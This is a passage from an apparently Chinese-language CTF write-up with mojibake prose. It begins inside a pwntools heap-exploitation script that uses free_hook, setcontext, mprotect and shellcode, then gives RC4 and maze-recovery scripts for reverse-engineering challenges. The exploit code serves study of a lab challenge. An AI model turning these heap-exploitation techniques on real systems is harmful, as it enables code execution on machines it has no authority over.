punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>free_hook<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>free_hook<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span>sc <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>set_context<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sig<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> sc<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>sc_addr <span class="token operator">=</span> free_hook <span class="token operator">+</span> <span class="token number">0x28</span><span class="token comment"># gdb.attach(sh, "b *$rebase(0x00000000000280C)\nc\n")</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sc_addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>sc_addr <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x12</span> <span class="token operator">+</span> sc<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sc_addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>sc_addr <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sc_addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>sc_addr <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>set_context <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>set_context <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> replace0<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>sig<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0xaf</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0xae</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0xa7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0xa6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x8f</span><span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x77</span><span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x6f</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x6e</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x68</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''edit(0,tmp[:0x6f])edit(0,tmp[:0x6e])edit(0,tmp[:0x67])edit(0,tmp[:0x66])for i in range(0x6):    edit(0,tmp[:0x5f-i])for i in range(0x16):    edit(0,tmp[:0x48-i])for i in range(0x3):    edit(0,tmp[:0x31-i])for i in range(0x24):    edit(0,tmp[:0x24-i])'''</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>ti<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="re1-crackme2-apk1"><a class="header-anchor" href="#re1-crackme2-apk1">Â¶</a>re1_crackme2_apk1</h3><p>è¿™é¢˜è€æ—©å°±å‡ºäº†ï¼Œæœ‰ä¸ªå‡½æ•°ç”¨è‡ªå·±çš„äº†ï¼Œå’Œé¢˜ç›®æœ‰ç‚¹åŒºåˆ«ï¼Œå¯¼è‡´flagä¸€ç›´ä¸å¯¹ï¼Œåé¢è¿‡äº†å¥½ä¹…æ‰ååº”è¿‡æ¥ï¼Œç—›å¤±ä¸€è¡€ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b0b096768b028daddb86db220d88a65a860854a1.png" alt="å›¾ç‰‡.png"></p><p>encodeå‡½æ•°</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-392b97a055c674c08bce2ff0307b0d5cf86adbf3.png" alt="å›¾ç‰‡.png"><br>æ˜æ˜¾çš„RC4ç‰¹å¾ï¼Œç›´æ¥è·‘å­˜å¥½çš„è„šæœ¬</p><figure><div class="code-wrapper"><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import base64def rc4_main(key &#x3D; &quot;init_key&quot;, message &#x3D; &quot;init_message&quot;):    print(&quot;RC4è§£å¯†ä¸»å‡½æ•°è°ƒç”¨æˆåŠŸ&quot;)    print(&#39;\n&#39;)    s_box &#x3D; rc4_init_sbox(key)    crypt &#x3D; rc4_excrypt(message, s_box)    return crypt    def rc4_init_sbox(key):    s_box &#x3D; list(range(256))     print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box)    print(&#39;\n&#39;)    j &#x3D; 0    for i in range(256):        j &#x3D; (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] &#x3D; s_box[j], s_box[i]    print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box)    print(&#39;\n&#39;)    return s_box    def rc4_excrypt(plain, box):    print(&quot;è°ƒç”¨è§£å¯†ç¨‹åºæˆåŠŸã€‚&quot;)    print(&#39;\n&#39;)    plain &#x3D; base64.b64decode(plain.encode(&#39;utf-8&#39;))    plain &#x3D; bytes.decode(plain)    res &#x3D; []    i &#x3D; j &#x3D; 0    for s in plain:        i &#x3D; (i + 1) % 256        j &#x3D; (j + box[i] + 136) % 256        box[i], box[j] &#x3D; box[j], box[i]        t &#x3D; (box[i] + box[j]) % 256        k &#x3D; box[t]        res.append(chr(ord(s) ^ k))    print(&quot;resç”¨äºè§£å¯†å­—ç¬¦ä¸²ï¼Œè§£å¯†åæ˜¯ï¼š%res&quot; %res)    print(&#39;\n&#39;)    cipher &#x3D; &quot;&quot;.join(res)    print(&quot;è§£å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s&quot; %cipher)    print(&#39;\n&#39;)    print(&quot;è§£å¯†åçš„è¾“å‡º(æ²¡ç»è¿‡ä»»ä½•ç¼–ç ):&quot;)    print(&#39;\n&#39;)    return  cipher# # target &#x3D; [205, &#39;R&#39;, &#39;t&#39;, &#39;z&#39;, 30, &#39;\b&#39;, &#39;\b&#39;, 224, &#39;W&#39;, &#39;;&#39;, 24, 153, 175, &#39;&#x3D;&#39;, 29, 148, 21, &#39;%&#39;, &#39;g&#39;, &#39;[&#39;, &#39;d&#39;, &#39;S&#39;, 31, &#39;;&#39;, 220, 162, &#39;F&#39;, &#39;6&#39;, 211, 253, 190, &#39;3&#39;]# target &#x3D; [205, 82,  116, 122, 30,  8,     8,  224,  87, 59,  24, 153, 175, 61,  29, 148, 21, 37,   103, 91, 100,  83, 31, 59,  220, 162, 70,  54,  211, 253, 190, 51]# for i in range(len(target)):#     print(hex(target[i]))# print(target)0xcd,0x52,0x74,0x7a,0x1e,0x8,0x8,0xe0,0x57,0x3b,0x18,0x99,0xaf,0x3d,0x1d,0x94,0x15,0x25,0x67,0x5b,0x64,0x53,0x1f,0x3b,0xdc,0xa2,0x46,0x36,0xd3,0xfd,0xbe,0x33a&#x3D;[0xcd,0x52,0x74,0x7a,0x1e,0x8,0x8,0xe0,0x57,0x3b,0x18,0x99,0xaf,0x3d,0x1d,0x94,0x15,0x25,0x67,0x5b,0x64,0x53,0x1f,0x3b,0xdc,0xa2,0x46,0x36,0xd3,0xfd,0xbe,0x33]s&#x3D;&quot;&quot;for i in a:    s+&#x3D;chr(i)s&#x3D;str(base64.b64encode(s.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;)rc4_main(&quot;happygame&quot;, s)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="re3-meikyu2"><a class="header-anchor" href="#re3-meikyu2">Â¶</a>re3_meikyu2</h3><p>æ˜¯ä¸ªpythonæ–‡ä»¶ï¼Œ<a href="http://xn--main-kf5f3se02y.py">ç»™äº†ä¸ªmain.py</a> ä¸€ä¸ªdata ä¸€ä¸ªdll å’Œpydæ–‡ä»¶ã€‚è®²çœŸç¬¬ä¸€æ¬¡çœ‹è§pydï¼Œé€»è¾‘ä¸éš¾æ‡‚ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> mylib<span class="token punctuation">.</span>pyd<span class="token keyword">from</span> mylib<span class="token punctuation">.</span>pyd <span class="token keyword">import</span> CheckStatus <span class="token keyword">as</span> CS<span class="token punctuation">,</span> START<span class="token punctuation">,</span> END<span class="token punctuation">,</span> WALL<span class="token punctuation">,</span> ROAD<span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Missing file: data'</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        map_ <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    cipher <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">b'suta-to'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> ch <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>map_<span class="token punctuation">)</span><span class="token punctuation">:</span>        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> ch <span class="token operator">^</span> cipher<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>START<span class="token punctuation">,</span> END<span class="token punctuation">,</span> WALL<span class="token punctuation">,</span> ROAD<span class="token punctuation">)</span><span class="token punctuation">:</span>            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Input key:'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">match</span> mylib<span class="token punctuation">.</span>check<span class="token punctuation">(</span>map_<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> CS<span class="token punctuation">.</span>FAIL<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Wrong key'</span><span class="token punctuation">)</span>        <span class="token keyword">case</span> CS<span class="token punctuation">.</span>SUCCESS<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Congratulations!!! Your flag is: `flag&#123;md5(key)&#125;`'</span><span class="token punctuation">)</span>        <span class="token keyword">case</span> CS<span class="token punctuation">.</span>ERROR_CIPHER_LEN <span class="token operator">|</span> CS<span class="token punctuation">.</span>ERROR_DATA_LEN <span class="token operator">|</span> CS<span class="token punctuation">.</span>ERROR_FMT <span class="token operator">|</span> CS<span class="token punctuation">.</span>FATAL_ERROR<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Something wrong, can you figure out?'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Bye~'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>ç½‘ä¸Šå¯¼å…¥pydçš„æ–¹å¼éƒ½è¯•è¿‡äº†ï¼Œæ²¡åŠæ³•æˆåŠŸå¯¼å…¥è¿™ä¸ªmylibã€‚æ‰€ä»¥å¯¹å…¶ä¸­çš„ä¸€äº›å‡½æ•°åªèƒ½idaé€†å‘ï¼Œè€Œä¸å¤ªèƒ½è°ƒè¯•åˆ†æã€‚<br>ç­”é¢˜çš„æµç¨‹æ˜¯åˆ¶ä½œä¸€ä¸ªmapï¼Œç„¶åç”¨checkå‡½æ•°æ£€æŸ¥ã€‚<br>é¢˜ç›®ç»™äº†æç¤ºæ˜¯æ·±åº¦ä¼˜å…ˆç®—æ³•ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d99fa8c6867f6465e6ebe8bfc9054111af65dce7.png" alt="å›¾ç‰‡.png"></p><p>101*101çš„è¿·å®«ã€‚<br>å°è¯•æ¢å¤è¿·å®«</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># import mylib</span><span class="token comment"># from mylib import CheckStatus as CS, START, END, WALL, ROAD</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Missing file: data'</span><span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                map_ <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>        cipher <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">b'suta-to'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i<span class="token punctuation">,</span> ch <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>map_<span class="token punctuation">)</span><span class="token punctuation">:</span>                map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> ch <span class="token operator">^</span> cipher<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">]</span>                <span class="token keyword">if</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">83</span><span class="token punctuation">:</span>                        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'S'</span>                <span class="token keyword">elif</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">35</span><span class="token punctuation">:</span>                        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0'</span>                <span class="token keyword">elif</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>                        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'1'</span>                <span class="token keyword">elif</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">69</span><span class="token punctuation">:</span>                        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'X'</span>                <span class="token comment"># if map_[i] not in (START, END, WALL, ROAD):</span>                <span class="token comment">#         exit(0)</span>        <span class="token comment"># print(map_)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>map_<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">101</span><span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>        <span class="token comment">#print(map_)</span>        <span class="token comment"># key = input('Input key:').encode()</span>        <span class="token comment"># match mylib.check(map_, list(key)):</span>        <span class="token comment">#         case CS.FAIL:</span>        <span class="token comment">#                 print('Wrong key')</span>        <span class="token comment">#         case CS.SUCCESS:</span>        <span class="token comment">#                 print('Congratulations!!! Your flag is: `flag&#123;md5(key)&#125;`')</span>        <span class="token comment">#         case CS.ERROR_CIPHER_LEN | CS.ERROR_DATA_LEN | CS.ERROR_FMT | CS.FATAL_ERROR:</span>        <span class="token comment">#                 print('Something wrong, can you figure out?')</span>        <span class="token comment"># print('Bye~')</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>        main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>çœŸçš„è¡€äºï¼Œè¿™é‡Œ</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fcb1cbf827d5de3bd60ccc30fdd49a51f3322b94.png" alt="å›¾ç‰‡.png"><br>å½“æ—¶å†™äº†i*100ï¼Œä¸ä»…æ²¡æ‹¿åˆ°äºŒè¡€ï¼Œè¿˜æ²¡åšå‡ºæ¥ã€‚ã€‚ã€‚ã€‚ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000S1011111111111111111111111111111111101111101111101110111110101011111111111111101010101011101110111010010101000101000000000000010001010000010000010000010001000001010100000001000000010101010100010001000100111011101011111110111010111010101111111010111010111111111011111111111010101111111111111110101010101000010101000100000001000100000000010000000101000101000000000100010000000001010000000000000001010101010011101010111111111110101110111010111111111111111111101011101010101010101011111010101111101111111111100001000000010101010001010001000101000100000100000000010100010100010101010100000101010000010000000000001111111110101010111111101110101111101111101111111110101111111110101110111111101010101010111110101110010101000000010001000100010001010000010000000000010001010000010001010001000000010101010101000001010000101011101011101111101110111011111110111011101011101011111010111111111111101010101011101011111011101000010100010001000100010001000100000000000100010000010100000100010001010100010101010100010100000001010011101010111111101011111110111111111111111111111111111110101110101010101111111111111110101111101110100101000100010100010001010001000001010100000001010101000001010000010000000001010101010001010000000101001011111110101110101110111111111010101111111010101010101011111111111111111010101010111111111010101110010101000101010000000101010100000100010101000000010001010100010001000001010000000001010101000101010000101011101010111011111010101111101110101011111010111111111110111011111010111110111110101011111111111001000100000001000001010101010000000001000101000100000001010000000001000001000000010101010100010101010010111111101111111010101010111111101111101011111111111010111111111011111011101111101010101110101010100101010101010101010001000001010000000100000101000101000001010000000100000000000101000001010000000001001010101010101010111011111010111110101111101011101011101010111110111111111110111011111010111111101110010100010101000101000101000101010001000000000101010100010000000001010000000000000101010001000000000100101110101010111010111011101010111111111111101010101111111111111010101010101110101010111011111111101001010101010000010101010000010100010101000101010000010100010100000000010101000101000001010101010100010010101010101111101010111110101110101011101010111110101110101111111010101011101111111010101010101010100101010100000101010101010001010101000100000001010001010001010101000101010100010000000101000100000100001010101011111010101010111010101011101111111010111010101010101011111111111111111111101011101010101010010000010001010100000101000100010100000000000100000000010001000000010101010100000100000100000101010100111010101110101111101011101010101111111010101111111111111010101110101010101111101111101110111111111001000100000100010000010100000100010101000101000000010101000001010000010100010100010000010001000101010010111111111011111110101111111110101011111111111110101011111011111110101110101110101110111111101010100001000000010001010000000000000000000100010000000100000001000100010101010101010000010000010100000000001110111111111010111111111111111111101110111111101111111011111110101010101010111111111110101110111110010100000001000001010100010101010100010001000100000101000001010000000000000001010001010001010001000000101110111111111010101110101010101011111011101111101